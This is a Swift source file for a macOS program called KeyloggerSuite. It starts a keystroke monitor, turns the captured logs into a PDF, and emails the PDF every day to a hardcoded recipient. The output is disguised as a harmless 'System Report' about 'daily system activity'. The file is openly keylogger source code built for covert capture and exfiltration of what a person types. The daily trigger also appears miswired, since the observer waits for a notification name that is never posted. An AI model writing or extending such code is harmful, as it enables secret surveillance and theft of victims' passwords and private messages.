import Foundation
import UserNotifications

class KeyloggerSuite {
    private let keyMonitor = KeyMonitor()
    private let logProcessor = LogProcessor()
    private let reportGenerator = ReportGenerator()
    private let emailService = EmailService()
    
    func startMonitoring() {
        guard keyMonitor.startMonitoring() else {
            print("Failed to start key monitoring")
            exit(1)
        }
        
        print("Key monitoring started successfully")
        scheduleDailyReport()
        
        // Keep application running
        RunLoop.main.run()
    }
    
    func generateAndSendReport() {
        let fileManager = AppFileManager.shared
        
        // Rotate logs to archive current data
        fileManager.rotateLogs()
        
        let recordPath = fileManager.logFilePath()
        let dataPath = fileManager.decodedLogFilePath()
        let pdfPath = fileManager.pdfReportPath()
        
        // Process log file
        guard logProcessor.processLog(inputPath: recordPath, outputPath: dataPath) else {
            print("Log processing failed")
            return
        }
        
        // Read processed data
        guard let reportContent = try? String(contentsOf: dataPath) else {
            print("Failed to read processed log")
            return
        }
        
        // Generate PDF report
        guard reportGenerator.generatePDFReport(from: reportContent, outputPath: pdfPath) else {
            print("PDF generation failed")
            return
        }
        
        // Send email
        let subject = "System Report - \(SystemInfo.computerName)"
        let body = "Attached is the daily system activity report"
        
        if emailService.sendReport(
            email: Constants.recipientEmail,
            subject: subject,
            body: body,
            attachmentPath: pdfPath
        ) {
            print("Report sent successfully")
        } else {
            print("Failed to send report")
        }
    }
    
    private func scheduleDailyReport() {
        // Request notification permissions
        let center = UNUserNotificationCenter.current()
        center.requestAuthorization(options: [.alert, .sound]) { granted, error in
            if !granted {
                print("Notification permission not granted")
            }
        }
        
        // Schedule daily at 2:00 AM
        var date = DateComponents()
        date.hour = 2
        date.minute = 0
        
        let trigger = UNCalendarNotificationTrigger(dateMatching: date, repeats: true)
        
        let content = UNMutableNotificationContent()
        content.title = "System Report"
        content.body = "Generating daily system report..."
        
        let request = UNNotificationRequest(
            identifier: "dailySystemReport",
            content: content,
            trigger: trigger
        )
        
        center.add(request) { error in
            if let error = error {
                print("Error scheduling report: \(error)")
            }
        }
        
        // Listen for notification
        center.getNotificationSettings { settings in
            if settings.authorizationStatus == .authorized {
                DispatchQueue.main.async {
                    NotificationCenter.default.addObserver(
                        forName: NSNotification.Name("dailyReportTrigger"),
                        object: nil,
                        queue: .main
                    ) { _ in
                        self.generateAndSendReport()
                    }
                }
            }
        }
    }
}

// Start the application
let suite = KeyloggerSuite()
suite.startMonitoring()